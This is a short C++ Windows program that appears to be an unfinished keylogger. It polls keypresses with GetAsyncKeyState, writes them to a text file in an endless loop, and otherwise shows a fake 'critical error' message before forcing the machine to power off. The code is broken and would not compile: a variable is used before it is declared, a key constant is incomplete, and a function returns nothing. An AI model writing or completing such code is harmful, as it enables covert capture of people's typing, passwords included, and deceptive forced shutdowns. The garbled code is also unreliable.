#include <windows.h>
#include <iostream>
#include <fstream>
char checks();
int main(){
  while(true==true){
    if(file.is_open()){
    ofstream file;
    file.open("file.txt");
    file<<checks();
    }    
    else{
      cout<<"A critial error has occured";
      cout<<"Windows will now shut down.";
      ExitWindowsEx(EWX_POWEROFF, 0);
      return 0;
    }
  }
}
char checks(){
  if(GetAsyncKeyState(VK_)){
    
  }
}
